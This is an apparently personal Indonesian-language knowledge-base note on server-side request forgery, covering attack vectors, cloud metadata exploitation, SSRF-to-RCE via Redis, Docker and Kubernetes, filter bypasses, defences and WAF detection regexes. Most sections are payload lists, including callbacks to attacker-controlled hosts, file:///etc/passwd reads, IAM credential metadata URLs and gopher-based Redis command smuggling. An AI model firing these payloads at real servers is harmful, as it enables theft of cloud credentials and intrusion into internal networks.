---
title: "Server Side Request Forgery (SSRF) — Deep Dive: Attack Vectors, Bypass, Blind Exploitation, Defense"
tags:
  - cyber-security
  - ssrf
  - web-security
  - api-security
  - library
aliases:
  - "SSRF Complete Guide"
  - "Server Side Request Forgery Techniques"
created: "2026-07-28"
updated: "2026-07-28"
status: pending
cssclasses:
  - wide-table
---

> [!info] Ringkasan
> Server-Side Request Forgery (SSRF) adalah kerentanan yang memungkinkan attacker memaksa server untuk membuat request HTTP ke target internal atau eksternal yang tidak seharusnya bisa diakses. SSRF adalah salah satu kerentanan paling berbahaya di arsitektur cloud modern — bisa pivot ke internal network, baca metadata cloud (AWS/GCP/Azure), dan bahkan RCE via service interaction. Catatan ini mencakup teknik SSRF klasik, blind SSRF, bypass WAF, cloud metadata exploitation, dan defense.

**Cross-link:** [[api-security-deep-dive]] → [[web-hacking-exploitation]] → [[cloud-native-security-aws-gcp-azure-deepdive]] → [[waf-reverse-proxy-deepdive]] → [[api-protocols-deepdive]]

---

## Daftar Isi
- [[#1. SSRF Attack Surface]]
- [[#2. SSRF Classification]]
- [[#3. Blind SSRF — Out-of-Band Detection]]
- [[#4. Cloud Metadata Exploitation]]
- [[#5. SSRF → RCE via Internal Services]]
- [[#6. URL Parsing Bypass Techniques]]
- [[#7. Bypass WAF & Filter]]
- [[#8. Defense Strategy]]
- [[#9. Detection Rules untuk WAF]]
- [[#10. Referensi & Tools]]

---

## 1. SSRF Attack Surface

SSRF terjadi ketika aplikasi mengambil URL dari user dan melakukan request HTTP ke URL tersebut tanpa validasi yang memadai.

### Sumber Input

```javascript
// URL dari parameter
GET /api/fetch?url=https://example.com

// URL dari request body
POST /api/proxy
{"url": "https://internal-api:8080/admin"}

// URL dari header
GET /api/import
X-Forwarded-Host: internal.service.local

// File upload URL
POST /api/import
{"file_url": "file:///etc/passwd"}

// Webhook URL
POST /api/webhook
{"callback": "http://169.254.169.254/latest/meta-data/"}
```

### Target Umum SSRF

| Target | Port | Tujuan |
|---|---|---|
| Cloud metadata | 80 | AWS `169.254.169.254`, GCP `metadata.google.internal` |
| Internal DB | 3306, 5432, 6379, 27017 | MySQL, PostgreSQL, Redis, MongoDB |
| Container orchestration | 2375, 2376, 6443 | Docker API, Kubernetes API |
| Internal services | 9200, 5601, 8080 | Elasticsearch, Kibana, internal apps |
| File protocol | — | `file:///etc/passwd`, `file:///proc/self/environ` |
| Internal DNS | 53 | DNS rebinding attack |

---

## 2. SSRF Classification

### Basic SSRF (In-Band)

```bash
# Response langsung terlihat
curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
# → Response: AWS instance metadata
```

### Blind SSRF (Out-of-Band)

```bash
# Response tidak langsung — perlu OOB detection
curl "http://target.com/fetch?url=http://attacker.oastify.com/collaborator"
# → Cek Burp Collaborator / interactsh untuk request masuk
```

### Semi-Blind SSRF

```bash
# Error message mengandung informasi
curl "http://target.com/fetch?url=http://internal:8080"
# → "Connection refused" vs timeout → port terbuka/tertutup
```

---

## 3. Blind SSRF — Out-of-Band Detection

### Tools OOB

| Tool | URL Pattern | Fungsi |
|---|---|---|
| Burp Collaborator | `*.oastify.com`, `*.burpcollaborator.net` | DNS + HTTP callback |
| interactsh | `*.oast.pro`, `*.oast.fun` | Open-source, self-hostable |
| webhook.site | `webhook.site/random-uuid` | HTTP callback |
| dnslog.cn | DNS query log | DNS callback |
| ProjectDiscovery | `*.oastify.com` (interactsh) | Integrated with nuclei |

### Detection Payloads

```bash
# DNS callback
?url=http://attacker.oastify.com/
?url=https://attacker.burpcollaborator.net/test

# HTTP callback
?url=http://[attacker-ip]:8080/collab

# FTP callback (bisa leak credential)
?url=ftp://attacker-ip:21/test

# Timing-based
?url=http://internal:3306  # MySQL port → response cepat
?url=http://internal:22    # SSH → response cepat
?url=http://internal:65535 # Random → timeout
```

---

## 4. Cloud Metadata Exploitation

### AWS Metadata

```bash
# Classic SSRF
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data/

# IMDSv2 bypass — attacker perlu PUT request dulu
# Tapi beberapa konfigurasi masih IMDSv1
```

### GCP Metadata

```bash
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header: Metadata-Flavor: Google
```

### Azure Metadata

```bash
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com
# Header: Metadata: true
```

### Alibaba Cloud

```bash
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/<role>
```

### DigitalOcean

```bash
http://169.254.169.254/metadata/v1.json
```

---

## 5. SSRF → RCE via Internal Services

### Redis (Port 6379)

```bash
# Redis via SSRF — bisa overwrite SSH key atau cron
# Step 1: Kirim command Redis via gopher protocol
gopher://internal-redis:6379/_FLUSHALL%0D%0A
gopher://internal-redis:6379/_SET%20cron%20...%0D%0ASAVE

# Atau via SSRF GET parameter dengan CRLF injection
# (jika server membypasskan CRLF ke Redis)
```

### Docker API (Port 2375)

```bash
# Docker API tanpa auth
http://internal-docker:2375/containers/json
http://internal-docker:2375/containers/create -X POST
# Bisa create container dengan volume mount host →
# RCE via container
```

### Kubernetes API (Port 6443)

```bash
# K8s API
http://internal-k8s:6443/api/v1/namespaces/default/pods
http://internal-k8s:6443/api/v1/namespaces/kube-system/secrets
```

### Elasticsearch (Port 9200)

```bash
http://internal-es:9200/_cat/indices
http://internal-es:9200/_search?q=password
```

### MinIO / S3 Compatible

```bash
http://internal-minio:9000/<bucket>/<key>
http://internal-s3:9000/webrc@
```

---

## 6. URL Parsing Bypass Techniques

### DNS Rebinding

```bash
# Same domain → resolve ke IP berbeda setelah DNS TTL expired
# Step 1: DNS resolve ke IP legitimate
# Step 2: DNS resolve berubah ke 169.254.169.254
# Tool: 1u.ms, rbndr.us
http://7f000001.1u.ms/  # Resolve ke 127.0.0.1
http://a9fea9fe.1u.ms/   # Resolve ke 169.254.169.254
```

### URL Parsing Confusion

```bash
# Redirect-based
http://legitimate.com@internal:8080  # userinfo@host confusion
http://legitimate.com#@internal:8080  # fragment confusion
http://legitimate.com\@internal:8080  # backslash confusion

# IPv6
http://[::1]:8080/  # IPv6 loopback
http://[0:0:0:0:0:ffff:169.254.169.254]/  # IPv4-mapped IPv6

# Decimal IP
http://2852039166/  # 169.254.169.254 in decimal
http://2130706433/  # 127.0.0.1 in decimal
http://3232235521/  # 192.168.0.1 in decimal

# Short URL
http://0/  # 0.0.0.0
http://0x7f000001/  # 0x7f000001 = 127.0.0.1
```

### Protocol Smuggling

```bash
# File protocol
file:///etc/passwd
file:///proc/self/environ
file:///proc/self/fd/0  # stdin

# Dict protocol
dict://internal:6379/INFO  # Redis command via dict://

# Gopher protocol — full TCP interaction
gopher://internal:6379/_*2%0D%0A$4%0D%0AAUTH...

# FTP protocol
ftp://attacker-ip:21/leak

# SMB protocol
smb://attacker-ip/share
```

---

## 7. Bypass WAF & Filter

### IP/URL Filter Bypass

```bash
# Redirect bypass — WAF cek URL awal, redirect ke internal
http://redirect-server.com/redirect?url=http://169.254.169.254/

# DNS rebinding
http://rebind-domain.com/  # resolve ke public → private

# IPv6 bypass
http://[::ffff:a9fe:a9fe]/  # = 169.254.169.254 in IPv6

# URL parsing confusion — WAF vs server beda parsing
http://127.0.0.1:80\@evil.com/admin  # WAF: evil.com, Server: 127.0.0.1
http://evil.com#@127.0.0.1/admin    # WAF: evil.com, Server: 127.0.0.1
```

### Request Splitting

```bash
# CRLF injection via URL
http://target:8080/%0D%0A/evil-path/
# Jika server meneruskan CRLF ke backend → request splitting

# Newline in URL
http://target:8080/ HTTP/1.1%0D%0AHost:%20evil.com
```

---

## 8. Defense Strategy

| Defense | Efektivitas | Implementasi |
|---|---|---|
| **Allowlist URL** | Sangat tinggi | Hanya domain tertentu diizinkan |
| **Block private IPs** | Tinggi | 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 |
| **Block metadata IPs** | Tinggi | 169.254.169.254, 100.100.100.200 |
| **Disable redirect** | Sedang | HTTP redirect perlu di-follow dengan cautious |
| **Strip sensitive chars** | Sedang | Block `file://`, `gopher://`, `dict://` |
| **DNS rebinding protection** | Tinggi | Validasi IP resolve after redirect |
| **Network segmentation** | Sangat tinggi | Internal services jangan expose ke web server |

### Implementasi Filter IP

```javascript
// Block private & metadata IPs
const privateRanges = [
  { start: '10.0.0.0', end: '10.255.255.255' },
  { start: '172.16.0.0', end: '172.31.255.255' },
  { start: '192.168.0.0', end: '192.168.255.255' },
  { start: '127.0.0.0', end: '127.255.255.255' },
  { start: '169.254.0.0', end: '169.254.255.255' },
];

function isPrivateIP(ip) {
  const ipNum = ipToNumber(ip);
  return privateRanges.some(r => 
    ipNum >= ipToNumber(r.start) && ipNum <= ipToNumber(r.end)
  );
}
```

---

## 9. Detection Rules untuk WAF

```rust
// Rule untuk deteksi SSRF di query/body
// Src: PayloadsAllTheThings/SSRF Injection/

// Deteksi metadata IP
static SSRF_METADATA_IP: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(169\.254\.169\.254|metadata\.google\.internal|metadata\.google\.compute|100\.100\.100\.200)"#).unwrap()
});

// Deteksi protocol smuggling
static SSRF_PROTOCOL: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)^(file|gopher|dict|ftp|smb)://"#).unwrap()
});

// Deteksi localhost bypass
static SSRF_LOCALHOST: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(127\.0\.0\.1|localhost|0\.0\.0\.0|0x7f000001|2130706433|\[::1\]|\[::\]|0177\.0\.0\.1)"#).unwrap()
});

// Deteksi URL redirect SSRF
static SSRF_REDIRECT: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(url\s*=|redirect\s*=|callback\s*=|webhook\s*=|fetch\s*=|proxy\s*=)"#).unwrap()
});
```

---

## 10. Referensi & Tools

### Payload Database

Lokasi payload: `/mnt/data_d/Projects/Reference/PayloadsAllTheThings/Server Side Request Forgery/`

### Tool SSRF

| Tool | Fungsi | Lokasi |
|---|---|---|
| **SSRFmap** | Auto-exploit SSRF → internal services | `/mnt/data_d/Projects/Reference/SSRFmap/` |
| **Interactsh** | OOB detection callback | `https://github.com/projectdiscovery/interactsh` |
| **1u.ms** | DNS rebinding service | `https://1u.ms/` |
| **rbndr.us** | DNS rebinding ASN-based | `https://rbndr.us/` |

**Cross-link vault:**
- [[api-security-deep-dive]] — API security
- [[web-hacking-exploitation]] — teknik exploit
- [[cloud-native-security-aws-gcp-azure-deepdive]] — cloud metadata
- [[waf-reverse-proxy-deepdive]] — WAF SSRF rules
- [[api-protocols-deepdive]] — protocol security
